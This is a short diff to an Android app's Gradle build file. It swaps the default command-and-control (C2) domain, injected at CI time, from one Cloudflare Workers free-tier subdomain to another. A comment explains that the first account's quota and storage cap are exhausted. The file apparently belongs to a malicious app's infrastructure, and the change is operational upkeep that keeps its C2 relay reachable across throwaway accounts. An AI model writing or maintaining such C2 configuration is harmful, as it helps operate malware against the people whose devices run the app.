@@ -17,7 +17,9 @@ android {
 
         // C2 Domain injection: set via env var or GitHub Secret during CI.
         // Default: Cloudflare Workers free subdomain
-        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow-worker.marwannaili-23-07.workers.dev"}\"")
+        // acct1 (marwan23) — acct2 (marwannaili-23-07) exhausted its DO free tier
+        // and shares its 5 GB storage cap with ~17 other namespaces.
+        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "cfg-relay.marwan23.workers.dev"}\"")
     }
 
     signingConfigs {
